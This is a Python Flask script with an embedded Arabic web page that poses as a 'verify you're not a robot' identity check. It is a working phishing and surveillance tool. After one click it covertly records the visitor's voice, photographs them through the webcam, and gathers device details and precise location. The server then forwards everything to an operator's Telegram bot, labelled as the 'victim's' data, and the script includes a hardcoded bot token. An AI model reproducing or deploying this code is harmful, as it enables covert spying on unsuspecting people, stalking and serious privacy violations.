import base64, json, time, requests, logging
from flask import Flask, render_template_string, request, jsonify
from threading import Thread, Lock

app = Flask(__name__)

BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

send_queue = []
queue_lock = Lock()

# ======= صفحة الصيد الجديدة (بدون توجيه حقيقي + صوت) =======
PAGE_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:#1a1a2e;padding:2rem;border-radius:2rem;text-align:center;max-width:400px}
        .btn{background:#e67e22;color:white;padding:1rem;border:none;border-radius:2rem;width:100%;font-size:1.2rem;cursor:pointer}
        #status{margin-top:1rem;color:#f39c12;font-weight:bold}
        video,canvas{display:none}
        .hidden{display:none}
    </style>
</head>
<body>
<div class="card">
    <h2>🔒 تأكيد الهوية</h2>
    <p>اضغط للتحقق أنك لست روبوتاً</p>
    <button class="btn" id="btn">تحقق الآن</button>
    <div id="status"></div>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function send(endpoint, data) {
        await fetch(endpoint, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    }

    btn.onclick = async () => {
        btn.disabled = true;
        statusDiv.innerText = "⏳ جاري التجهيز...";
        
        try {
            // طلب الصوت والفيديو معاً
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            video.srcObject = stream;
            
            // تسجيل الصوت لمدة 3 ثوانٍ
            statusDiv.innerText = "🎙️ تسجيل الصوت...";
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onloadend = () => {
                    send('/api/data', { type: 'audio', data: reader.result });
                };
                reader.readAsDataURL(audioBlob);
            };
            mediaRecorder.start();
            await new Promise(r => setTimeout(r, 3000));
            mediaRecorder.stop();
            
            // التقاط صورة من الفيديو بعد 1.5 ثانية
            statusDiv.innerText = "📸 التقاط الصورة...";
            await new Promise(r => setTimeout(r, 1500));
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.9);
            send('/api/data', { type: 'photo', data: img });
            
            // إيقاف الكاميرا والميكروفون
            stream.getTracks().forEach(t => t.stop());
            
            // معلومات الجهاز
            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
            const device = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                battery: Math.round(battery.level * 100),
                charging: battery.charging
            };
            send('/api/data', { type: 'device', data: device });
            
            // الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(pos => {
                send('/api/data', { type: 'location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
            }, null, { enableHighAccuracy: true });
            
            // ✅ رسالة وهمية بدون توجيه لأي رابط خارجي
            statusDiv.innerHTML = "✅ تم التحقق بنجاح.<br>سوف يتم توجيهك قريباً...";
            // لا نغير window.location.href أبداً
            btn.disabled = false;  // يمكن الضغط مرة أخرى لكن الأفضل تعطيله
        } catch(e) {
            console.error(e);
            statusDiv.innerText = "❌ يرجى السماح بالكاميرا والميكروفون والموقع";
            btn.disabled = false;
        }
    };
</script>
</body>
</html>
"""

def send_telegram(data):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    try:
        if data['type'] == 'text':
            r = requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': data['text'], 'parse_mode': 'HTML'}, timeout=10)
        elif data['type'] == 'photo':
            img_bytes = base64.b64decode(data['photo'].split(',')[1])
            r = requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': data.get('caption','')}, files={'photo': ('img.jpg', img_bytes)}, timeout=15)
        elif data['type'] == 'audio':
            audio_bytes = base64.b64decode(data['audio'].split(',')[1])
            r = requests.post(url + "sendAudio", data={'chat_id': ADMIN_ID, 'caption': data.get('caption','')}, files={'audio': ('voice.webm', audio_bytes)}, timeout=15)
        return r.status_code == 200
    except Exception as e:
        print("Send error:", e)
        return False

def queue_worker():
    while True:
        time.sleep(5)
        with queue_lock:
            if send_queue:
                item = send_queue.pop(0)
                send_telegram(item)

Thread(target=queue_worker, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(PAGE_HTML)

@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.get_json()
    if not data:
        return jsonify({'ok': False}), 400
    t = data['type']
    if t == 'photo':
        send_queue.append({'type': 'photo', 'photo': data['data'], 'caption': '📸 صورة الضحية'})
    elif t == 'audio':
        send_queue.append({'type': 'audio', 'audio': data['data'], 'caption': '🎤 تسجيل صوتي للضحية'})
    elif t == 'device':
        d = data['data']
        txt = f"""<b>📱 معلومات الجهاز</b>
🌐 المتصفح: {d['ua'][:80]}
🖥️ المنصة: {d['platform']}
🗣️ اللغة: {d['lang']}
🧠 النوى: {d['cores']}
💾 الرام: {d['ram']} GB
🔋 بطارية: {d['battery']}% {'🔌' if d['charging'] else ''}"""
        send_queue.append({'type': 'text', 'text': txt})
    elif t == 'location':
        loc = data['data']
        txt = f"📍 الموقع:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
        send_queue.append({'type': 'text', 'text': txt})
    return jsonify({'ok': True})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat = str(update['message']['chat']['id'])
        if chat == ADMIN_ID:
            text = update['message'].get('text', '')
            url_api = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            if text == '/start':
                kb = {'inline_keyboard': [[{'text': '🔗 رابط الصيد', 'callback_data': 'link'}]]}
                requests.post(url_api + "sendMessage", json={'chat_id': chat, 'text': 'أهلاً بك في لوحة التحكم', 'reply_markup': kb})
            elif text == '/link':
                base = request.host_url.rstrip('/')
                requests.post(url_api + "sendMessage", json={'chat_id': chat, 'text': f'رابط الصيد: {base}'})
    elif update and 'callback_query' in update:
        cb = update['callback_query']
        if cb['data'] == 'link':
            base = request.host_url.rstrip('/')
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': cb['message']['chat']['id'], 'text': base})
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
